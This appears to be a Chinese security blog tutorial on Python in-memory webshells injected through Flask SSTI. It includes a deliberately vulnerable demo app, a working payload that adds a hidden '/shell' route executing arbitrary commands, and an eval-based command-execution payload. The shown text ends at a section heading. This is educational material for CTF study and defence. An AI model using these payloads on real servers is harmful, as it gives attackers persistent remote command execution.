<!DOCTYPE html>
<html lang="zh-cn" dir="ltr">
    <head><meta charset='utf-8'>
<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content="pythonå†…å­˜é©¬å­¦ä¹  å¸¸ç”¨çš„Pythonæ¡†æ¶æœ‰Djangoã€Flask, è¿™ä¸¤è€…éƒ½å¯èƒ½å­˜åœ¨SSTIæ¼æ´. Python å†…å­˜é©¬åˆ©ç”¨Flaskæ¡†æ¶ä¸­SSTIæ³¨å…¥æ¥å®ç°, Flaskæ¡†æ¶ä¸­åœ¨webåº”ç”¨æ¨¡æ¿æ¸²æŸ“çš„è¿‡ç¨‹ä¸­ç”¨åˆ°render_template_stringè¿›è¡Œæ¸²æŸ“, ä½†æœªå¯¹ç”¨æˆ·ä¼ è¾“çš„ä»£ç è¿›è¡Œè¿‡æ»¤å¯¼è‡´ç”¨æˆ·å¯ä»¥é€šè¿‡æ³¨å…¥æ¶æ„ä»£ç æ¥å®ç°Pythonå†…å­˜é©¬çš„æ³¨å…¥.\n">
<title>pythonå†…å­˜é©¬å­¦ä¹ </title>

<link rel='canonical' href='https://0d000721999.github.io/p/python%E5%86%85%E5%AD%98%E9%A9%AC%E5%AD%A6%E4%B9%A0/'>

<link rel="stylesheet" href="/scss/style.min.37a6022266b4205ec3a616ff86e34064f3524e0913faf185a3d362063a8d7490.css"><meta property='og:title' content="pythonå†…å­˜é©¬å­¦ä¹ ">
<meta property='og:description' content="pythonå†…å­˜é©¬å­¦ä¹  å¸¸ç”¨çš„Pythonæ¡†æ¶æœ‰Djangoã€Flask, è¿™ä¸¤è€…éƒ½å¯èƒ½å­˜åœ¨SSTIæ¼æ´. Python å†…å­˜é©¬åˆ©ç”¨Flaskæ¡†æ¶ä¸­SSTIæ³¨å…¥æ¥å®ç°, Flaskæ¡†æ¶ä¸­åœ¨webåº”ç”¨æ¨¡æ¿æ¸²æŸ“çš„è¿‡ç¨‹ä¸­ç”¨åˆ°render_template_stringè¿›è¡Œæ¸²æŸ“, ä½†æœªå¯¹ç”¨æˆ·ä¼ è¾“çš„ä»£ç è¿›è¡Œè¿‡æ»¤å¯¼è‡´ç”¨æˆ·å¯ä»¥é€šè¿‡æ³¨å…¥æ¶æ„ä»£ç æ¥å®ç°Pythonå†…å­˜é©¬çš„æ³¨å…¥.\n">
<meta property='og:url' content='https://0d000721999.github.io/p/python%E5%86%85%E5%AD%98%E9%A9%AC%E5%AD%A6%E4%B9%A0/'>
<meta property='og:site_name' content='ç¾å’•å™œçš„å°ç«™'>
<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:tag' content='å†…å­˜é©¬' /><meta property='article:tag' content='flask' /><meta property='article:tag' content='tornado' /><meta property='article:tag' content='django' /><meta property='article:tag' content='pyramid' /><meta property='article:published_time' content='2025-04-16T00:00:00&#43;00:00'/><meta property='article:modified_time' content='2025-04-16T00:00:00&#43;00:00'/><meta property='og:image' content='https://0d000721999.github.io/p/python%E5%86%85%E5%AD%98%E9%A9%AC%E5%AD%A6%E4%B9%A0/1.webp' />
<meta name="twitter:title" content="pythonå†…å­˜é©¬å­¦ä¹ ">
<meta name="twitter:description" content="pythonå†…å­˜é©¬å­¦ä¹  å¸¸ç”¨çš„Pythonæ¡†æ¶æœ‰Djangoã€Flask, è¿™ä¸¤è€…éƒ½å¯èƒ½å­˜åœ¨SSTIæ¼æ´. Python å†…å­˜é©¬åˆ©ç”¨Flaskæ¡†æ¶ä¸­SSTIæ³¨å…¥æ¥å®ç°, Flaskæ¡†æ¶ä¸­åœ¨webåº”ç”¨æ¨¡æ¿æ¸²æŸ“çš„è¿‡ç¨‹ä¸­ç”¨åˆ°render_template_stringè¿›è¡Œæ¸²æŸ“, ä½†æœªå¯¹ç”¨æˆ·ä¼ è¾“çš„ä»£ç è¿›è¡Œè¿‡æ»¤å¯¼è‡´ç”¨æˆ·å¯ä»¥é€šè¿‡æ³¨å…¥æ¶æ„ä»£ç æ¥å®ç°Pythonå†…å­˜é©¬çš„æ³¨å…¥.\n"><meta name="twitter:card" content="summary_large_image">
    <meta name="twitter:image" content='https://0d000721999.github.io/p/python%E5%86%85%E5%AD%98%E9%A9%AC%E5%AD%A6%E4%B9%A0/1.webp' />
    <link rel="shortcut icon" href="/favicon.ico" />

    </head>
    <body class="
    article-page
    ">
    <script>
        (function() {
            const colorSchemeKey = 'StackColorScheme';
            localStorage.setItem(colorSchemeKey, "light");
        })();
    </script><script>
    (function() {
        const colorSchemeKey = 'StackColorScheme';
        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;

        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
            

            document.documentElement.dataset.scheme = 'dark';
        } else {
            document.documentElement.dataset.scheme = 'light';
        }
    })();
</script>
<div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky ">
    <button class="hamburger hamburger--spin" type="button" id="toggle-menu" aria-label="åˆ‡æ¢èœå•">
        <span class="hamburger-box">
            <span class="hamburger-inner"></span>
        </span>
    </button>

    <header>
        
            
            <figure class="site-avatar">
                <a href="/">
                
                    
                    
                    
                        
                        <img src="/img/avatar_hu988272603220494224.png" width="300"
                            height="300" class="site-logo" loading="lazy" alt="Avatar">
                    
                
                </a>
                
                    <span class="emoji">ğŸ˜‹</span>
                
            </figure>
            
        
        
        <div class="site-meta">
            <h1 class="site-name"><a href="/">ç¾å’•å™œçš„å°ç«™</a></h1>
            <h2 class="site-description">Cialloï½(âˆ ãƒ»Ï‰&lt; )âŒ’â˜…</h2>
        </div>
    </header><ol class="menu-social">
            
                <li>
                    <a 
                        href='https://buuoj.cn/users/175721'
                        target="_blank"
                        title="BUUOJ"
                        rel="me"
                    >
                        
                        
                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-letter-b" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <path d="M7 20v-16h6a4 4 0 0 1 0 8a4 4 0 0 1 0 8h-6" />
  <line x1="7" y1="12" x2="13" y2="12" />
</svg>



                        
                    </a>
                </li>
            
                <li>
                    <a 
                        href='https://github.com/0d000721999'
                        target="_blank"
                        title="GitHub"
                        rel="me"
                    >
                        
                        
                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
  <path d="M9 19c-4.3 1.4 -4.3 -2.5 -6 -3m12 5v-3.5c0 -1 .1 -1.4 -.5 -2c2.8 -.3 5.5 -1.4 5.5 -6a4.6 4.6 0 0 0 -1.3 -3.2a4.2 4.2 0 0 0 -.1 -3.2s-1.1 -.3 -3.5 1.3a12.3 12.3 0 0 0 -6.2 0c-2.4 -1.6 -3.5 -1.3 -3.5 -1.3a4.2 4.2 0 0 0 -.1 3.2a4.6 4.6 0 0 0 -1.3 3.2c0 4.6 2.7 5.7 5.5 6c-.6 .6 -.6 1.2 -.5 2v3.5" />
</svg>



                        
                    </a>
                </li>
            
        </ol><ol class="menu" id="main-menu">
        
        
        
        <li >
            <a href='/' >
                
                
                
                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <polyline points="5 12 3 12 12 3 21 12 19 12" />
  <path d="M5 12v7a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-7" />
  <path d="M9 21v-6a2 2 0 0 1 2 -2h2a2 2 0 0 1 2 2v6" />
</svg>



                
                <span>ä¸»é¡µ</span>
            </a>
        </li>
        
        
        <li >
            <a href='/%E5%85%B3%E4%BA%8E/' >
                
                
                
                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-user" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="12" cy="7" r="4" />
  <path d="M6 21v-2a4 4 0 0 1 4 -4h4a4 4 0 0 1 4 4v2" />
</svg>



                
                <span>å…³äº</span>
            </a>
        </li>
        
        
        <li >
            <a href='/archives/' >
                
                
                
                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <rect x="3" y="4" width="18" height="4" rx="2" />
  <path d="M5 8v10a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-10" />
  <line x1="10" y1="12" x2="14" y2="12" />
</svg>



                
                <span>Archives</span>
            </a>
        </li>
        
        
        <li >
            <a href='/search/' >
                
                
                
                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="10" cy="10" r="7" />
  <line x1="21" y1="21" x2="15" y2="15" />
</svg>



                
                <span>Search</span>
            </a>
        </li>
        
        
        <li >
            <a href='/friends/' >
                
                
                
                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <line x1="5" y1="9" x2="19" y2="9" />
  <line x1="5" y1="15" x2="19" y2="15" />
  <line x1="11" y1="4" x2="7" y2="20" />
  <line x1="17" y1="4" x2="13" y2="20" />
</svg>



                
                <span>Friends</span>
            </a>
        </li>
        
        
        <li >
            <a href='/links/' >
                
                
                
                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-link" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <path d="M10 14a3.5 3.5 0 0 0 5 0l4 -4a3.5 3.5 0 0 0 -5 -5l-.5 .5" />
  <path d="M14 10a3.5 3.5 0 0 0 -5 0l-4 4a3.5 3.5 0 0 0 5 5l.5 -.5" />
</svg>



                
                <span>Links</span>
            </a>
        </li>
        
        <li class="menu-bottom-section">
            <ol class="menu">

                
            </ol>
        </li>
    </ol>
</aside>

    <aside class="sidebar right-sidebar sticky">
        
            
                
    <section class="widget archives">
        <div class="widget-icon">
            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <line x1="5" y1="9" x2="19" y2="9" />
  <line x1="5" y1="15" x2="19" y2="15" />
  <line x1="11" y1="4" x2="7" y2="20" />
  <line x1="17" y1="4" x2="13" y2="20" />
</svg>



        </div>
        <h2 class="widget-title section-title">ç›®å½•</h2>
        
        <div class="widget--toc">
            <nav id="TableOfContents">
  <ol>
    <li><a href="#è€ç‰ˆflaskå†…å­˜é©¬">è€ç‰ˆflaskå†…å­˜é©¬</a>
      <ol>
        <li><a href="#flask-è¯·æ±‚ä¸Šä¸‹æ–‡ç®¡ç†æœºåˆ¶">Flask è¯·æ±‚ä¸Šä¸‹æ–‡ç®¡ç†æœºåˆ¶</a></li>
        <li><a href="#æ¼æ´ç¯å¢ƒ">æ¼æ´ç¯å¢ƒ</a></li>
        <li><a href="#payloadåˆ†æ">payloadåˆ†æ</a></li>
        <li><a href="#sysmodules">sys.modules</a></li>
        <li><a href="#bypassæ–¹æ³•">bypassæ–¹æ³•</a></li>
      </ol>
    </li>
    <li><a href="#æ–°ç‰ˆflaskå†…å­˜é©¬">æ–°ç‰ˆflaskå†…å­˜é©¬</a>
      <ol>
        <li><a href="#before_request">before_request</a></li>
        <li><a href="#after_request">after_request</a></li>
        <li><a href="#errorhandler">errorhandler</a></li>
        <li><a href="#è¿˜æ˜¯åˆ©ç”¨add_url_rule">è¿˜æ˜¯åˆ©ç”¨add_url_rule</a></li>
      </ol>
    </li>
    <li><a href="#tornado">Tornado</a></li>
    <li><a href="#django">Django</a></li>
    <li><a href="#pyramid">pyramid</a>
      <ol>
        <li><a href="#ç¬¬ä¸€å±Šå›½åŸæ¯ez_gallery">ç¬¬ä¸€å±Šå›½åŸæ¯ez_Gallery</a>
          <ol>
            <li><a href="#xiapao">xiapao</a></li>
            <li><a href="#pyramidé’©å­å‡½æ•°">pyramidé’©å­å‡½æ•°</a></li>
            <li><a href="#åˆ©ç”¨headerå¤´å¤–å¸¦å›æ˜¾">åˆ©ç”¨headerå¤´å¤–å¸¦å›æ˜¾</a></li>
          </ol>
        </li>
        <li><a href="#httpé”™è¯¯å›æ˜¾">HTTPé”™è¯¯å›æ˜¾</a>
          <ol>
            <li><a href="#500çŠ¶æ€ç ">500çŠ¶æ€ç </a></li>
            <li><a href="#404çŠ¶æ€ç ">404çŠ¶æ€ç </a></li>
          </ol>
        </li>
        <li><a href="#å¼ºç½‘æ¯å†³èµ›pyramid">å¼ºç½‘æ¯å†³èµ›pyramid</a></li>
      </ol>
    </li>
  </ol>
</nav>
        </div>
    </section>

            
        
    </aside>


            <main class="main full-width">
    <article class="has-image main-article">
    <header class="article-header">
        <div class="article-image">
            <a href="/p/python%E5%86%85%E5%AD%98%E9%A9%AC%E5%AD%A6%E4%B9%A0/">
                <img src="/p/python%E5%86%85%E5%AD%98%E9%A9%AC%E5%AD%A6%E4%B9%A0/1.webp"
                        
                        width="1920" 
                        height="1080" 
                        loading="lazy"
                        alt="Featured image of post pythonå†…å­˜é©¬å­¦ä¹ " />
                
            </a>
        </div>
    

    <div class="article-details">
    
    <header class="article-category">
        
            <a href="/categories/python/" style="background-color: #2a9d8f; color: #fff;">
                Python
            </a>
        
    </header>
    

    <div class="article-title-wrapper">
        <h2 class="article-title">
            <a href="/p/python%E5%86%85%E5%AD%98%E9%A9%AC%E5%AD%A6%E4%B9%A0/">pythonå†…å­˜é©¬å­¦ä¹ </a>
        </h2>
    
        
    </div>

    
    
    
    
    <footer class="article-time">
        
            <div>
                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <path d="M11.795 21h-6.795a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v4" />
  <circle cx="18" cy="18" r="4" />
  <path d="M15 3v4" />
  <path d="M7 3v4" />
  <path d="M3 11h16" />
  <path d="M18 16.496v1.504l1 1" />
</svg>
                <time class="article-time--published">Apr 16, 2025</time>
            </div>
        

        
            <div>
                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="12" cy="12" r="9" />
  <polyline points="12 7 12 12 15 15" />
</svg>



                <time class="article-time--reading">
                    é˜…è¯»æ—¶é•¿: 16 åˆ†é’Ÿ
                </time>
            </div>
        
    </footer>
    

    
</div>

</header>

    <section class="article-content">
    
    
    <h1 id="pythonå†…å­˜é©¬å­¦ä¹ ">pythonå†…å­˜é©¬å­¦ä¹ 
</h1><p>å¸¸ç”¨çš„<code>Python</code>æ¡†æ¶æœ‰<code>Django</code>ã€<code>Flask</code>, è¿™ä¸¤è€…éƒ½å¯èƒ½å­˜åœ¨<code>SSTI</code>æ¼æ´. <code>Python å†…å­˜é©¬</code>åˆ©ç”¨<code>Flask</code>æ¡†æ¶ä¸­<code>SSTI</code>æ³¨å…¥æ¥å®ç°, <code>Flask</code>æ¡†æ¶ä¸­åœ¨<code>web</code>åº”ç”¨æ¨¡æ¿æ¸²æŸ“çš„è¿‡ç¨‹ä¸­ç”¨åˆ°<code>render_template_string</code>è¿›è¡Œæ¸²æŸ“, ä½†æœªå¯¹ç”¨æˆ·ä¼ è¾“çš„ä»£ç è¿›è¡Œè¿‡æ»¤å¯¼è‡´ç”¨æˆ·å¯ä»¥é€šè¿‡æ³¨å…¥æ¶æ„ä»£ç æ¥å®ç°<code>Python</code>å†…å­˜é©¬çš„æ³¨å…¥.</p>
<h2 id="è€ç‰ˆflaskå†…å­˜é©¬">è€ç‰ˆflaskå†…å­˜é©¬
</h2><h3 id="flask-è¯·æ±‚ä¸Šä¸‹æ–‡ç®¡ç†æœºåˆ¶">Flask è¯·æ±‚ä¸Šä¸‹æ–‡ç®¡ç†æœºåˆ¶
</h3><p>å½“ç½‘é¡µè¯·æ±‚è¿›å…¥<code>Flask</code>æ—¶, ä¼šå®ä¾‹åŒ–ä¸€ä¸ª<code>Request Context</code>. åœ¨<code>Python</code>ä¸­åˆ†å‡ºäº†ä¸¤ç§ä¸Šä¸‹æ–‡: è¯·æ±‚ä¸Šä¸‹æ–‡(request context)ã€åº”ç”¨ä¸Šä¸‹æ–‡(session context). ä¸€ä¸ªè¯·æ±‚ä¸Šä¸‹æ–‡ä¸­å°è£…äº†è¯·æ±‚çš„ä¿¡æ¯, è€Œä¸Šä¸‹æ–‡çš„ç»“æ„æ˜¯è¿ç”¨äº†ä¸€ä¸ª<code>Stack</code>çš„æ ˆç»“æ„, ä¹Ÿå°±æ˜¯è¯´å®ƒæ‹¥æœ‰ä¸€ä¸ªæ ˆæ‰€æ‹¥æœ‰çš„å…¨éƒ¨ç‰¹æ€§. <code>request context</code>å®ä¾‹åŒ–åä¼šè¢«<code>push</code>åˆ°æ ˆ<code>_request_ctx_stack</code>ä¸­, åŸºäºæ­¤ç‰¹æ€§ä¾¿å¯ä»¥é€šè¿‡è·å–æ ˆé¡¶å…ƒç´ çš„æ–¹æ³•æ¥è·å–å½“å‰çš„è¯·æ±‚.</p>
<h3 id="æ¼æ´ç¯å¢ƒ">æ¼æ´ç¯å¢ƒ
</h3><p>flaskå†™SSTI-demo</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">flask</span> <span class="kn">import</span> <span class="n">Flask</span><span class="p">,</span> <span class="n">request</span><span class="p">,</span> <span class="n">render_template_string</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">app</span> <span class="o">=</span> <span class="n">Flask</span><span class="p">(</span><span class="vm">__name__</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nd">@app.route</span><span class="p">(</span><span class="s1">&#39;/&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">hello_world</span><span class="p">():</span>  <span class="c1"># put application&#39;s code here</span>
</span></span><span class="line"><span class="cl">    <span class="n">person</span> <span class="o">=</span> <span class="s1">&#39;knave&#39;</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">request</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;name&#39;</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="n">person</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;name&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">template</span> <span class="o">=</span> <span class="s1">&#39;&lt;h1&gt;Hi, </span><span class="si">%s</span><span class="s1">.&lt;/h1&gt;&#39;</span> <span class="o">%</span> <span class="n">person</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">render_template_string</span><span class="p">(</span><span class="n">template</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s1">&#39;__main__&#39;</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">app</span><span class="o">.</span><span class="n">run</span><span class="p">()</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>åŸå§‹<code>Flask</code>å†…å­˜é©¬<code>Payload</code>:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">url_for.__globals__[&#39;__builtins__&#39;][&#39;eval&#39;](&#34;app.add_url_rule(&#39;/shell&#39;, &#39;shell&#39;, lambda :__import__(&#39;os&#39;).popen(_request_ctx_stack.top.request.args.get(&#39;cmd&#39;, &#39;whoami&#39;)).read())&#34;,{&#39;_request_ctx_stack&#39;:url_for.__globals__[&#39;_request_ctx_stack&#39;],&#39;app&#39;:url_for.__globals__[&#39;current_app&#39;]})
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="payloadåˆ†æ">payloadåˆ†æ
</h3><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">url_for</span><span class="o">.</span><span class="vm">__globals__</span><span class="p">[</span><span class="s1">&#39;__builtins__&#39;</span><span class="p">][</span><span class="s1">&#39;eval&#39;</span><span class="p">](</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;app.add_url_rule(</span>
</span></span><span class="line"><span class="cl">        <span class="s1">&#39;/shell&#39;</span><span class="p">,</span> 
</span></span><span class="line"><span class="cl">        <span class="s1">&#39;shell&#39;</span><span class="p">,</span> 
</span></span><span class="line"><span class="cl">        <span class="k">lambda</span> <span class="p">:</span><span class="nb">__import__</span><span class="p">(</span><span class="s1">&#39;os&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">popen</span><span class="p">(</span><span class="n">_request_ctx_stack</span><span class="o">.</span><span class="n">top</span><span class="o">.</span><span class="n">request</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;cmd&#39;</span><span class="p">,</span> <span class="s1">&#39;whoami&#39;</span><span class="p">))</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="p">)</span><span class="s2">&#34;,</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="s1">&#39;_request_ctx_stack&#39;</span><span class="p">:</span><span class="n">url_for</span><span class="o">.</span><span class="vm">__globals__</span><span class="p">[</span><span class="s1">&#39;_request_ctx_stack&#39;</span><span class="p">],</span>
</span></span><span class="line"><span class="cl">        <span class="s1">&#39;app&#39;</span><span class="p">:</span><span class="n">url_for</span><span class="o">.</span><span class="vm">__globals__</span><span class="p">[</span><span class="s1">&#39;current_app&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p><code>url_for</code>æ˜¯<code>Flask</code>çš„ä¸€ä¸ªå†…ç½®å‡½æ•°, é€šè¿‡<code>Flask</code>å†…ç½®å‡½æ•°å¯ä»¥è°ƒç”¨å…¶<code>__globals__</code>å±æ€§, è¯¥ç‰¹æ®Šå±æ€§èƒ½å¤Ÿè¿”å›å‡½æ•°æ‰€åœ¨æ¨¡å—å‘½åç©ºé—´çš„æ‰€æœ‰å˜é‡, å…¶ä¸­åŒ…å«äº†å¾ˆå¤šå·²ç»å¼•å…¥çš„<code>modules</code>, å¯ä»¥çœ‹åˆ°è¿™é‡Œæ˜¯æ”¯æŒ<code>__builtins__</code>çš„.</p>
<p>åœ¨<code>__builtins__</code>æ¨¡å—ä¸­, <code>Python</code>åœ¨å¯åŠ¨æ—¶å°±ç›´æ¥ä¸ºæˆ‘ä»¬å¯¼å…¥äº†å¾ˆå¤šå†…å»ºå‡½æ•°. å‡†ç¡®çš„è¯´, <code>Python</code>åœ¨å¯åŠ¨æ—¶ä¼šé¦–å…ˆåŠ è½½å†…å»ºåç§°ç©ºé—´, å†…å»ºåç§°ç©ºé—´ä¸­æœ‰è®¸å¤šåå­—åˆ°å¯¹è±¡ä¹‹é—´çš„æ˜ å°„, è¿™äº›åå­—å°±æ˜¯å†…å»ºå‡½æ•°çš„åç§°, å¯¹è±¡å°±æ˜¯è¿™äº›å†…å»ºå‡½æ•°å¯¹è±¡. å¯ä»¥çœ‹åˆ°, åœ¨<code>__builtins__</code>æ¨¡å—çš„å†…å»ºå‡½æ•°ä¸­æ˜¯å­˜åœ¨<code>eval</code>ã€<code>exec</code>ç­‰å‘½ä»¤æ‰§è¡Œå‡½æ•°çš„.</p>
<p>ç”±äºå­˜åœ¨å‘½ä»¤æ‰§è¡Œå‡½æ•°, å› æ­¤æˆ‘ä»¬å°±å¯ä»¥ç›´æ¥è°ƒç”¨å‘½ä»¤æ‰§è¡Œå‡½æ•°æ¥æ‰§è¡Œå±é™©æ“ä½œ, <code>Exploit</code>å¦‚ä¸‹:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">{{url_for.__globals__[&#39;__builtins__&#39;][&#39;eval&#39;](&#34;__import__(&#39;os&#39;).system(&#39;open -a Calculator&#39;)&#34;)}}
</span></span></code></pre></td></tr></table>
</div>
</div><p>æ¥ç€å†æ¥çœ‹çœ‹<code>app.add_url_rule('/shell', 'shell', lambda :__import__('os').popen(_request_ctx_stack.top.request.args.get('cmd', 'whoami')).read())</code>è¿™ä¸€æˆª<code>Payload</code>. è¿™éƒ¨åˆ†æ˜¯åŠ¨æ€æ·»åŠ äº†ä¸€æ¡è·¯ç”±, è€Œå¤„ç†è¯¥è·¯ç”±çš„å‡½æ•°æ˜¯ä¸ªç”±<code>lambda</code>å…³é”®å­—å®šä¹‰çš„åŒ¿åå‡½æ•°.</p>
<p>åœ¨<code>Flask</code>ä¸­æ³¨å†Œè·¯ç”±çš„æ—¶å€™æ˜¯æ·»åŠ çš„<code>@app.route()</code>è£…é¥°å™¨æ¥å®ç°çš„, è·Ÿè¿›æŸ¥çœ‹å…¶æºç å®ç°, å‘ç°å…¶è°ƒç”¨äº†<code>add_url_rule</code>å‡½æ•°æ¥æ·»åŠ è·¯ç”±.</p>
<p><code>lambda</code>å³åŒ¿åå‡½æ•°, <code>Payload</code>ä¸­<code>add_url_rule</code>å‡½æ•°çš„ç¬¬ä¸‰ä¸ªå‚æ•°å®šä¹‰äº†ä¸€ä¸ª<code>lambda</code>åŒ¿åå‡½æ•°, å…¶ä¸­é€šè¿‡<code>os</code>åº“çš„<code>popen</code>å‡½æ•°æ‰§è¡Œä»<code>Web</code>è¯·æ±‚ä¸­è·å–çš„<code>cmd</code>å‚æ•°å€¼å¹¶è¿”å›ç»“æœ, å…¶ä¸­è¯¥å‚æ•°å€¼é»˜è®¤ä¸º<code>whoami</code>.</p>
<h3 id="sysmodules">sys.modules
</h3><blockquote>
